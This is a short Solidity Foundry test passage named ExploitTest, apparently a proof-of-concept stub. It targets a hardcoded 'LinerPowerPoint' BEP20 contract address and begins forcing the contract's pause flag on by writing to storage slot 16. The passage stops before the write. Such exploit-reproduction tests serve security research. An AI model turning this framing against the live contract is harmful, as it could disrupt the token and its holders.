interface LinerPowerPoint {
    function pause() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for storage manipulation
        vm.label(TARGET, "LinerPowerPoint");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Directly manipulate storage to set pause = true
        // pause is at slot 16 (0-based) in BEP20 contract
        bytes32 pauseSlot = bytes32(uint256(16));
        bytes32 pauseValue = bytes32(uint256(1)); // true = 1
